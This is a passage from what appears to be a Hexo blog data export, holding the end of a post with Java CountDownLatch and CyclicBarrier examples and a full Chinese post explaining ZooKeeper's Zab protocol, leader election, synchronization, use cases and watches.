class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5FAA;&#x73AF;&#x4E0B;&#x9762;12&#x4E2A;&#x7EBF;&#x7A0B;</span><br><span class=\"line\">\t\tfor(int i=0;i&lt;12;i++){</span><br><span class=\"line\">\t\t\texecutor.execute(new similarKnowledgeHandle(startSignal));</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class similarKnowledgeHandle implements Runnable{</span><br><span class=\"line\">\t\tCountDownLatch startSignal;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic similarKnowledgeHandle(CountDownLatch startSignal) {</span><br><span class=\"line\">\t\t\tthis.startSignal =startSignal;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\tstartSignal.countDown();</span><br><span class=\"line\">\t\t\tSystem.out.println(startSignal.getCount()); //&#x663E;&#x793A;&#x5F53;&#x524D;&#x8BA1;&#x6570;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class ExportStats implements Runnable{</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tCountDownLatch startSignal;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic ExportStats(CountDownLatch startSignal) {</span><br><span class=\"line\">\t\t\tthis.startSignal =startSignal;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\ttry {</span><br><span class=\"line\">\t\t\t\tstartSignal.await(); //&#x5F53;&#x8BA1;&#x6570;&#x4E3A;0&#x524D;&#xFF0C;&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x7684;&#x7EBF;&#x7A0B;&#x4E00;&#x76F4;&#x5904;&#x4E8E;&#x7B49;&#x5F85;&#x72B6;&#x6001;</span><br><span class=\"line\">\t\t\t\tSystem.out.println(&quot;start export.......&quot;);</span><br><span class=\"line\">\t\t\t} catch (InterruptedException e) {</span><br><span class=\"line\">\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t}</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p></p>\n<p><br></p>\n<h3 id=\"cyclicBarrier\"><a href=\"#cyclicBarrier\" class=\"headerlink\" title=\"cyclicBarrier\"></a>cyclicBarrier</h3><p>&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8F85;&#x52A9;&#x7C7B;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4E00;&#x7EC4;&#x7EBF;&#x7A0B;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#xFF0C;&#x76F4;&#x5230;&#x5230;&#x8FBE;&#x67D0;&#x4E2A;&#x516C;&#x5171;&#x5C4F;&#x969C;&#x70B9; (common barrier point)&#x3002;&#x5728;&#x6D89;&#x53CA;&#x4E00;&#x7EC4;&#x56FA;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x7EBF;&#x7A0B;&#x7684;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;&#x5FC5;&#x987B;&#x4E0D;&#x65F6;&#x5730;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#xFF0C;&#x6B64;&#x65F6; CyclicBarrier &#x5F88;&#x6709;&#x7528;&#x3002;&#x56E0;&#x4E3A;&#x8BE5; barrier &#x5728;&#x91CA;&#x653E;&#x7B49;&#x5F85;&#x7EBF;&#x7A0B;&#x540E;&#x53EF;&#x4EE5;&#x91CD;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x79F0;&#x5B83;&#x4E3A;&#x5FAA;&#x73AF; &#x7684; barrier&#x3002;</p>\n<p><strong>&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A;</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Solver {</span><br><span class=\"line\">   final int N;</span><br><span class=\"line\">   final float[][] data;</span><br><span class=\"line\">   final CyclicBarrier barrier;</span><br><span class=\"line\">   </span><br><span class=\"line\">   class Worker implements Runnable {</span><br><span class=\"line\">     int myRow;</span><br><span class=\"line\">     Worker(int row) { myRow = row; }</span><br><span class=\"line\">     public void run() {</span><br><span class=\"line\">       while (!done()) {</span><br><span class=\"line\">         processRow(myRow);</span><br><span class=\"line\"></span><br><span class=\"line\">         try {</span><br><span class=\"line\">           barrier.await(); </span><br><span class=\"line\">         } catch (InterruptedException ex) { </span><br><span class=\"line\">return; </span><br><span class=\"line\">         } catch (BrokenBarrierException ex) { </span><br><span class=\"line\">return; </span><br><span class=\"line\">         }</span><br><span class=\"line\">       }</span><br><span class=\"line\">     }</span><br><span class=\"line\">   }</span><br><span class=\"line\"></span><br><span class=\"line\">   public Solver(float[][] matrix) {</span><br><span class=\"line\">     data = matrix;</span><br><span class=\"line\">     N = matrix.length;</span><br><span class=\"line\">     barrier = new CyclicBarrier(N, </span><br><span class=\"line\">                                 new Runnable() {</span><br><span class=\"line\">                                   public void run() { </span><br><span class=\"line\">                                     mergeRows(...); </span><br><span class=\"line\">                                   }</span><br><span class=\"line\">                                 });</span><br><span class=\"line\">     for (int i = 0; i &lt; N; ++i) </span><br><span class=\"line\">       new Thread(new Worker(i)).start();</span><br><span class=\"line\"></span><br><span class=\"line\">     waitUntilDone();</span><br><span class=\"line\">   }</span><br><span class=\"line\"> }</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"cyclicBarrier-&#x548C;-CountDownLatch-&#x7684;&#x533A;&#x522B;\"><a href=\"#cyclicBarrier-&#x548C;-CountDownLatch-&#x7684;&#x533A;&#x522B;\" class=\"headerlink\" title=\"cyclicBarrier &#x548C;  CountDownLatch &#x7684;&#x533A;&#x522B;\"></a>cyclicBarrier &#x548C;  CountDownLatch &#x7684;&#x533A;&#x522B;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/countDownLatch%E5%92%8CcyclicBarrier/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>"},{"title":"Zookeeper原理","date":"2016-05-19T13:18:00.000Z","toc":false,"_content":"\nZookeeper的核心是原子广播，这个机制保证了各个Server之间的同步。实现这个机制的协议叫做Zab协议。Zab协议有两种模式，它们分别是恢复模式（选主）和广播模式（同步）。当服务启动或者在领导者崩溃后，Zab就进入了恢复模式，当领导者被选举出来，且大多数Server完成了和leader的状态同步以后，恢复模式就结束了。状态同步保证了leader和Server具有相同的系统状态。\n\n为了保证事务的顺序一致性，zookeeper采用了递增的事务id号（zxid）来标识事务。所有的提议（proposal）都在被提出的时候加上了zxid。实现中zxid是一个64位的数字，它高32位是epoch用来标识leader关系是否改变，每次一个leader被选出来，它都会有一个新的epoch，标识当前属于那个leader的统治时期。低32位用于递增计数。\n\n每个Server在工作过程中有三种状态：\n- LOOKING：当前Server不知道leader是谁，正在搜寻\n- LEADING：当前Server即为选举出来的leader\n- FOLLOWING：leader已经选举出来，当前Server与之同步\n\n<!-- more -->\n- - -\n### 选主流程\n\n当leader崩溃或者leader失去大多数的follower，这时候zk进入恢复模式，恢复模式需要重新选举出一个新的leader，让所有的Server都恢复到一个正确的状态。Zk的选举算法有两种：一种是基于basic paxos实现的，另外一种是基于fast paxos算法实现的。系统默认的选举算法为fast paxos。先介绍basic paxos流程：\n\n1、选举线程由当前Server发起选举的线程担任，其主要功能是对投票结果进行统计，并选出推荐的Server；\n2、选举线程首先向所有Server发起一次询问(包括自己)；\n3、选举线程收到回复后，验证是否是自己发起的询问(验证zxid是否一致)，然后获取对方的id(myid)，并存储到当前询问对象列表中，最后获取对方提议的leader相关信息(id,zxid)，并将这些信息存储到当次选举的投票记录表中；\n4、收到所有Server回复以后，就计算出zxid最大的那个Server，并将这个Server相关信息设置成下一次要投票的Server；\n5、线程将当前zxid最大的Server设置为当前Server要推荐的Leader，如果此时获胜的Server获得n/2 + 1的Server票数， 设置当前推荐的leader为获胜的Server，将根据获胜的Server相关信息设置自己的状态，否则，继续这个过程，直到leader被选举出来。\n\n通过流程分析我们可以得出：要使Leader获得多数Server的支持，则Server总数必须是奇数2n+1，且存活的Server的数目不得少于n+1.\n\n每个Server启动后都会重复以上流程。在恢复模式下，如果是刚从崩溃状态恢复的或者刚启动的server还会从磁盘快照中恢复数据和会话信息，zk会记录事务日志并定期进行快照，方便在恢复时进行状态恢复。选主的具体流程图如下所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/1.png)\n\nfast paxos流程是在选举过程中，某Server首先向所有Server提议自己要成为leader，当其它Server收到提议以后，解决epoch和zxid的冲突，并接受对方的提议，然后向对方发送接受提议完成的消息，重复这个流程，最后一定能选举出Leader。其流程图如下所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/2.png)\n\n- - -\n### 同步流程\n\n选完leader以后，zk就进入状态同步过程。\n1、leader等待server连接；\n2、Follower连接leader，将最大的zxid发送给leader；\n3、Leader根据follower的zxid确定同步点；\n4、完成同步后通知follower 已经成为uptodate状态；\n5、Follower收到uptodate消息后，又可以重新接受client的请求进行服务了。\n\n流程图如下所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/3.png)\n\n- - -\n### 工作流程\n#### Leader工作流程\n\nLeader主要有三个功能：\n1、恢复数据；\n2、维持与Learner的心跳，接收Learner请求并判断Learner的请求消息类型；\n3、Learner的消息类型主要有PING消息、REQUEST消息、ACK消息、REVALIDATE消息，根据不同的消息类型，进行不同的处理。\n\nPING消息是指Learner的心跳信息；REQUEST消息是Follower发送的提议信息，包括写请求及同步请求；ACK消息是Follower的对提议的回复，超过半数的Follower通过，则commit该提议；REVALIDATE消息是用来延长SESSION有效时间。\n\nLeader的工作流程简图如下所示，在实际实现中，流程要比下图复杂得多，启动了三个线程来实现功能。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/4.png)\n\n#### Follower工作流程\n\nFollower主要有四个功能：\n1、向Leader发送请求（PING消息、REQUEST消息、ACK消息、REVALIDATE消息）；\n2、接收Leader消息并进行处理；\n3、接收Client的请求，如果为写请求，发送给Leader进行投票；\n4、返回Client结果。\n\nFollower的消息循环处理如下几种来自Leader的消息：\n\n1、ING消息： 心跳消息；\n2、PROPOSAL消息：Leader发起的提案，要求Follower投票；\n3、COMMIT消息：服务器端最新一次提案的信息；\n4、UPTODATE消息：表明同步完成；\n5、REVALIDATE消息：根据Leader的REVALIDATE结果，关闭待revalidate的session还是允许其接受消息；\n6、SYNC消息：返回SYNC结果到客户端，这个消息最初由客户端发起，用来强制得到最新的更新。\n\nFollower的工作流程简图如下所示，在实际实现中，Follower是通过5个线程来实现功能的。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/5.png)\n\n对于observer的流程不再叙述，observer流程和Follower的唯一不同的地方就是observer不会参加leader发起的投票。\n\n- - -\n### 主流应用场景\n\nZookeeper的主流应用场景实现思路（除去官方示例） \n\n#### 配置管理\n集中式的配置管理在应用集群中是非常常见的，一般商业公司内部都会实现一套集中的配置管理中心，应对不同的应用集群对于共享各自配置的需求，并且在配置变更时能够通知到集群中的每一个机器。\n\nZookeeper很容易实现这种集中式的配置管理，比如将APP1的所有配置配置到/APP1 znode下，APP1所有机器一启动就对/APP1这个节点进行监控(zk.exist(\"/APP1\",true)),并且实现回调方法Watcher，那么在zookeeper上/APP1 znode节点下数据发生变化的时候，每个机器都会收到通知，Watcher方法将会被执行，那么应用再取下数据即可(zk.getData(\"/APP1\",false,null));\n\n以上这个例子只是简单的粗颗粒度配置监控，细颗粒度的数据可以进行分层级监控，这一切都是可以设计和控制的。\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/6.png)\n\n#### 集群管理 \n应用集群中，我们常常需要让每一个机器知道集群中（或依赖的其他某一个集群）哪些机器是活着的，并且在集群机器因为宕机，网络断链等原因能够不在人工介入的情况下迅速通知到每一个机器。\n\nZookeeper同样很容易实现这个功能，比如我在zookeeper服务器端有一个znode叫/APP1SERVERS,那么集群中每一个机器启动的时候都去这个节点下创建一个EPHEMERAL类型的节点，比如server1创建/APP1SERVERS/SERVER1(可以使用ip,保证不重复)，server2创建/APP1SERVERS/SERVER2，然后SERVER1和SERVER2都watch /APP1SERVERS这个父节点，那么也就是这个父节点下数据或者子节点变化都会通知对该节点进行watch的客户端。因为EPHEMERAL类型节点有一个很重要的特性，就是客户端和服务器端连接断掉或者session过期就会使节点消失，那么在某一个机器挂掉或者断链的时候，其对应的节点就会消失，然后集群中所有对/APP1SERVERS进行watch的客户端都会收到通知，然后取得最新列表即可。\n\n另外有一个应用场景就是集群选master,一旦master挂掉能够马上能从slave中选出一个master,实现步骤和前者一样，只是机器在启动的时候在APP1SERVERS创建的节点类型变为EPHEMERAL_SEQUENTIAL类型，这样每个节点会自动被编号\n\n我们默认规定编号最小的为master,所以当我们对/APP1SERVERS节点做监控的时候，得到服务器列表，只要所有集群机器逻辑认为最小编号节点为master，那么master就被选出，而这个master宕机的时候，相应的znode会消失，然后新的服务器列表就被推送到客户端，然后每个节点逻辑认为最小编号节点为master，这样就做到动态master选举。\n![](7.png)\n\n- - -\n### Zookeeper监视简介\n\nZookeeper C API 的声明和描述在 include/zookeeper.h 中可以找到，另外大部分的 Zookeeper C API 常量、结构体声明也在 zookeeper.h 中，如果如果你在使用 C API 是遇到不明白的地方，最好看看 zookeeper.h，或者自己使用 doxygen 生成 Zookeeper C API 的帮助文档。\n\nZookeeper 中最有特色且最不容易理解的是监视(Watches)。Zookeeper 所有的读操作——getData(), getChildren(), 和 exists() 都 可以设置监视(watch)，监视事件可以理解为一次性的触发器， 官方定义如下： a watch event is one-time trigger, sent to the client that set the watch, which occurs when the data for which the watch was set changes。对此需要作出如下理解：\n\n- One-time trigge（一次性触发）\n\n 当设置监视的数据发生改变时，该监视事件会被发送到客户端，例如，如果客户端调用了 getData(\"/znode1\", true) 并且稍后 /znode1 节点上的数据发生了改变或者被删除了，客户端将会获取到 /znode1 发生变化的监视事件，而如果 /znode1 再一次发生了变化，除非客户端再次对 /znode1 设置监视，否则客户端不会收到事件通知。\n\n- Sent to the client（发送至客户端）\n\n Zookeeper 客户端和服务端是通过 socket 进行通信的，由于网络存在故障，所以监视事件很有可能不会成功地到达客户端，监视事件是异步发送至监视者的，Zookeeper 本身提供了保序性(ordering guarantee)：即客户端只有首先看到了监视事件后，才会感知到它所设置监视的 znode 发生了变化(a client will never see a change for which it has set a watch until it first sees the watch event). 网络延迟或者其他因素可能导致不同的客户端在不同的时刻感知某一监视事件，但是不同的客户端所看到的一切具有一致的顺序。\n\n- The data for which the watch was set（被设置 watch 的数据）\n\n 这意味着 znode 节点本身具有不同的改变方式。你也可以想象 Zookeeper 维护了两条监视链表：数据监视和子节点监视(data watches and child watches) getData() and exists() 设置数据监视，getChildren() 设置子节点监视。 或者，你也可以想象 Zookeeper 设置的不同监视返回不同的数据，getData() 和 exists() 返回 znode 节点的相关信息，而 getChildren() 返回子节点列表。因此， setData() 会触发设置在某一节点上所设置的数据监视(假定数据设置成功)，而一次成功的 create() 操作则会出发当前节点上所设置的数据监视以及父节点的子节点监视。一次成功的 delete() 操作将会触发当前节点的数据监视和子节点监视事件，同时也会触发该节点父节点的child watch。\n\nZookeeper 中的监视是轻量级的，因此容易设置、维护和分发。当客户端与 Zookeeper 服务器端失去联系时，客户端并不会收到监视事件的通知，只有当客户端重新连接后，若在必要的情况下，以前注册的监视会重新被注册并触发，对于开发人员来说 这通常是透明的。只有一种情况会导致监视事件的丢失，即：通过 exists() 设置了某个 znode 节点的监视，但是如果某个客户端在此 znode 节点被创建和删除的时间间隔内与 zookeeper 服务器失去了联系，该客户端即使稍后重新连接 zookeeper服务器后也得不到事件通知","source":"_posts/Zookeeper原理.md","raw":"---\ntitle: Zookeeper原理\ncategories:\n  - 其他技术\ntags:\n  - 大数据\ndate: 2016-5-19 21:18:00\ntoc: false\n---\n\nZookeeper的核心是原子广播，这个机制保证了各个Server之间的同步。实现这个机制的协议叫做Zab协议。Zab协议有两种模式，它们分别是恢复模式（选主）和广播模式（同步）。当服务启动或者在领导者崩溃后，Zab就进入了恢复模式，当领导者被选举出来，且大多数Server完成了和leader的状态同步以后，恢复模式就结束了。状态同步保证了leader和Server具有相同的系统状态。\n\n为了保证事务的顺序一致性，zookeeper采用了递增的事务id号（zxid）来标识事务。所有的提议（proposal）都在被提出的时候加上了zxid。实现中zxid是一个64位的数字，它高32位是epoch用来标识leader关系是否改变，每次一个leader被选出来，它都会有一个新的epoch，标识当前属于那个leader的统治时期。低32位用于递增计数。\n\n每个Server在工作过程中有三种状态：\n- LOOKING：当前Server不知道leader是谁，正在搜寻\n- LEADING：当前Server即为选举出来的leader\n- FOLLOWING：leader已经选举出来，当前Server与之同步\n\n<!-- more -->\n- - -\n### 选主流程\n\n当leader崩溃或者leader失去大多数的follower，这时候zk进入恢复模式，恢复模式需要重新选举出一个新的leader，让所有的Server都恢复到一个正确的状态。Zk的选举算法有两种：一种是基于basic paxos实现的，另外一种是基于fast paxos算法实现的。系统默认的选举算法为fast paxos。先介绍basic paxos流程：\n\n1、选举线程由当前Server发起选举的线程担任，其主要功能是对投票结果进行统计，并选出推荐的Server；\n2、选举线程首先向所有Server发起一次询问(包括自己)；\n3、选举线程收到回复后，验证是否是自己发起的询问(验证zxid是否一致)，然后获取对方的id(myid)，并存储到当前询问对象列表中，最后获取对方提议的leader相关信息(id,zxid)，并将这些信息存储到当次选举的投票记录表中；\n4、收到所有Server回复以后，就计算出zxid最大的那个Server，并将这个Server相关信息设置成下一次要投票的Server；\n5、线程将当前zxid最大的Server设置为当前Server要推荐的Leader，如果此时获胜的Server获得n/2 + 1的Server票数， 设置当前推荐的leader为获胜的Server，将根据获胜的Server相关信息设置自己的状态，否则，继续这个过程，直到leader被选举出来。\n\n通过流程分析我们可以得出：要使Leader获得多数Server的支持，则Server总数必须是奇数2n+1，且存活的Server的数目不得少于n+1.\n\n每个Server启动后都会重复以上流程。在恢复模式下，如果是刚从崩溃状态恢复的或者刚启动的server还会从磁盘快照中恢复数据和会话信息，zk会记录事务日志并定期进行快照，方便在恢复时进行状态恢复。选主的具体流程图如下所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/1.png)\n\nfast paxos流程是在选举过程中，某Server首先向所有Server提议自己要成为leader，当其它Server收到提议以后，解决epoch和zxid的冲突，并接受对方的提议，然后向对方发送接受提议完成的消息，重复这个流程，最后一定能选举出Leader。其流程图如下所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/2.png)\n\n- - -\n### 同步流程\n\n选完leader以后，zk就进入状态同步过程。\n1、leader等待server连接；\n2、Follower连接leader，将最大的zxid发送给leader；\n3、Leader根据follower的zxid确定同步点；\n4、完成同步后通知follower 已经成为uptodate状态；\n5、Follower收到uptodate消息后，又可以重新接受client的请求进行服务了。\n\n流程图如下所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/3.png)\n\n- - -\n### 工作流程\n#### Leader工作流程\n\nLeader主要有三个功能：\n1、恢复数据；\n2、维持与Learner的心跳，接收Learner请求并判断Learner的请求消息类型；\n3、Learner的消息类型主要有PING消息、REQUEST消息、ACK消息、REVALIDATE消息，根据不同的消息类型，进行不同的处理。\n\nPING消息是指Learner的心跳信息；REQUEST消息是Follower发送的提议信息，包括写请求及同步请求；ACK消息是Follower的对提议的回复，超过半数的Follower通过，则commit该提议；REVALIDATE消息是用来延长SESSION有效时间。\n\nLeader的工作流程简图如下所示，在实际实现中，流程要比下图复杂得多，启动了三个线程来实现功能。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/4.png)\n\n#### Follower工作流程\n\nFollower主要有四个功能：\n1、向Leader发送请求（PING消息、REQUEST消息、ACK消息、REVALIDATE消息）；\n2、接收Leader消息并进行处理；\n3、接收Client的请求，如果为写请求，发送给Leader进行投票；\n4、返回Client结果。\n\nFollower的消息循环处理如下几种来自Leader的消息：\n\n1、ING消息： 心跳消息；\n2、PROPOSAL消息：Leader发起的提案，要求Follower投票；\n3、COMMIT消息：服务器端最新一次提案的信息；\n4、UPTODATE消息：表明同步完成；\n5、REVALIDATE消息：根据Leader的REVALIDATE结果，关闭待revalidate的session还是允许其接受消息；\n6、SYNC消息：返回SYNC结果到客户端，这个消息最初由客户端发起，用来强制得到最新的更新。\n\nFollower的工作流程简图如下所示，在实际实现中，Follower是通过5个线程来实现功能的。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/5.png)\n\n对于observer的流程不再叙述，observer流程和Follower的唯一不同的地方就是observer不会参加leader发起的投票。\n\n- - -\n### 主流应用场景\n\nZookeeper的主流应用场景实现思路（除去官方示例） \n\n#### 配置管理\n集中式的配置管理在应用集群中是非常常见的，一般商业公司内部都会实现一套集中的配置管理中心，应对不同的应用集群对于共享各自配置的需求，并且在配置变更时能够通知到集群中的每一个机器。\n\nZookeeper很容易实现这种集中式的配置管理，比如将APP1的所有配置配置到/APP1 znode下，APP1所有机器一启动就对/APP1这个节点进行监控(zk.exist(\"/APP1\",true)),并且实现回调方法Watcher，那么在zookeeper上/APP1 znode节点下数据发生变化的时候，每个机器都会收到通知，Watcher方法将会被执行，那么应用再取下数据即可(zk.getData(\"/APP1\",false,null));\n\n以上这个例子只是简单的粗颗粒度配置监控，细颗粒度的数据可以进行分层级监控，这一切都是可以设计和控制的。\n![](http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/6.png)\n\n#### 集群管理 \n应用集群中，我们常常需要让每一个机器知道集群中（或依赖的其他某一个集群）哪些机器是活着的，并且在集群机器因为宕机，网络断链等原因能够不在人工介入的情况下迅速通知到每一个机器。\n\nZookeeper同样很容易实现这个功能，比如我在zookeeper服务器端有一个znode叫/APP1SERVERS,那么集群中每一个机器启动的时候都去这个节点下创建一个EPHEMERAL类型的节点，比如server1创建/APP1SERVERS/SERVER1(可以使用ip,保证不重复)，server2创建/APP1SERVERS/SERVER2，然后SERVER1和SERVER2都watch /APP1SERVERS这个父节点，那么也就是这个父节点下数据或者子节点变化都会通知对该节点进行watch的客户端。因为EPHEMERAL类型节点有一个很重要的特性，就是客户端和服务器端连接断掉或者session过期就会使节点消失，那么在某一个机器挂掉或者断链的时候，其对应的节点就会消失，然后集群中所有对/APP1SERVERS进行watch的客户端都会收到通知，然后取得最新列表即可。\n\n另外有一个应用场景就是集群选master,一旦master挂掉能够马上能从slave中选出一个master,实现步骤和前者一样，只是机器在启动的时候在APP1SERVERS创建的节点类型变为EPHEMERAL_SEQUENTIAL类型，这样每个节点会自动被编号\n\n我们默认规定编号最小的为master,所以当我们对/APP1SERVERS节点做监控的时候，得到服务器列表，只要所有集群机器逻辑认为最小编号节点为master，那么master就被选出，而这个master宕机的时候，相应的znode会消失，然后新的服务器列表就被推送到客户端，然后每个节点逻辑认为最小编号节点为master，这样就做到动态master选举。\n![](7.png)\n\n- - -\n### Zookeeper监视简介\n\nZookeeper C API 的声明和描述在 include/zookeeper.h 中可以找到，另外大部分的 Zookeeper C API 常量、结构体声明也在 zookeeper.h 中，如果如果你在使用 C API 是遇到不明白的地方，最好看看 zookeeper.h，或者自己使用 doxygen 生成 Zookeeper C API 的帮助文档。\n\nZookeeper 中最有特色且最不容易理解的是监视(Watches)。Zookeeper 所有的读操作——getData(), getChildren(), 和 exists() 都 可以设置监视(watch)，监视事件可以理解为一次性的触发器， 官方定义如下： a watch event is one-time trigger, sent to the client that set the watch, which occurs when the data for which the watch was set changes。对此需要作出如下理解：\n\n- One-time trigge（一次性触发）\n\n 当设置监视的数据发生改变时，该监视事件会被发送到客户端，例如，如果客户端调用了 getData(\"/znode1\", true) 并且稍后 /znode1 节点上的数据发生了改变或者被删除了，客户端将会获取到 /znode1 发生变化的监视事件，而如果 /znode1 再一次发生了变化，除非客户端再次对 /znode1 设置监视，否则客户端不会收到事件通知。\n\n- Sent to the client（发送至客户端）\n\n Zookeeper 客户端和服务端是通过 socket 进行通信的，由于网络存在故障，所以监视事件很有可能不会成功地到达客户端，监视事件是异步发送至监视者的，Zookeeper 本身提供了保序性(ordering guarantee)：即客户端只有首先看到了监视事件后，才会感知到它所设置监视的 znode 发生了变化(a client will never see a change for which it has set a watch until it first sees the watch event). 网络延迟或者其他因素可能导致不同的客户端在不同的时刻感知某一监视事件，但是不同的客户端所看到的一切具有一致的顺序。\n\n- The data for which the watch was set（被设置 watch 的数据）\n\n 这意味着 znode 节点本身具有不同的改变方式。你也可以想象 Zookeeper 维护了两条监视链表：数据监视和子节点监视(data watches and child watches) getData() and exists() 设置数据监视，getChildren() 设置子节点监视。 或者，你也可以想象 Zookeeper 设置的不同监视返回不同的数据，getData() 和 exists() 返回 znode 节点的相关信息，而 getChildren() 返回子节点列表。因此， setData() 会触发设置在某一节点上所设置的数据监视(假定数据设置成功)，而一次成功的 create() 操作则会出发当前节点上所设置的数据监视以及父节点的子节点监视。一次成功的 delete() 操作将会触发当前节点的数据监视和子节点监视事件，同时也会触发该节点父节点的child watch。\n\nZookeeper 中的监视是轻量级的，因此容易设置、维护和分发。当客户端与 Zookeeper 服务器端失去联系时，客户端并不会收到监视事件的通知，只有当客户端重新连接后，若在必要的情况下，以前注册的监视会重新被注册并触发，对于开发人员来说 这通常是透明的。只有一种情况会导致监视事件的丢失，即：通过 exists() 设置了某个 znode 节点的监视，但是如果某个客户端在此 znode 节点被创建和删除的时间间隔内与 zookeeper 服务器失去了联系，该客户端即使稍后重新连接 zookeeper服务器后也得不到事件通知","slug":"Zookeeper原理","published":1,"updated":"2016-11-17T11:59:42.672Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcn002sgwtm49trk5o4","content":"<p>Zookeeper&#x7684;&#x6838;&#x5FC3;&#x662F;&#x539F;&#x5B50;&#x5E7F;&#x64AD;&#xFF0C;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x4FDD;&#x8BC1;&#x4E86;&#x5404;&#x4E2A;Server&#x4E4B;&#x95F4;&#x7684;&#x540C;&#x6B65;&#x3002;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x7684;&#x534F;&#x8BAE;&#x53EB;&#x505A;Zab&#x534F;&#x8BAE;&#x3002;Zab&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF0C;&#x5B83;&#x4EEC;&#x5206;&#x522B;&#x662F;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF08;&#x9009;&#x4E3B;&#xFF09;&#x548C;&#x5E7F;&#x64AD;&#x6A21;&#x5F0F;&#xFF08;&#x540C;&#x6B65;&#xFF09;&#x3002;&#x5F53;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x6216;&#x8005;&#x5728;&#x9886;&#x5BFC;&#x8005;&#x5D29;&#x6E83;&#x540E;&#xFF0C;Zab&#x5C31;&#x8FDB;&#x5165;&#x4E86;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x9886;&#x5BFC;&#x8005;&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x4E14;&#x5927;&#x591A;&#x6570;Server&#x5B8C;&#x6210;&#x4E86;&#x548C;leader&#x7684;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4EE5;&#x540E;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x5C31;&#x7ED3;&#x675F;&#x4E86;&#x3002;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4FDD;&#x8BC1;&#x4E86;leader&#x548C;Server&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#x72B6;&#x6001;&#x3002;</p>\n<p>&#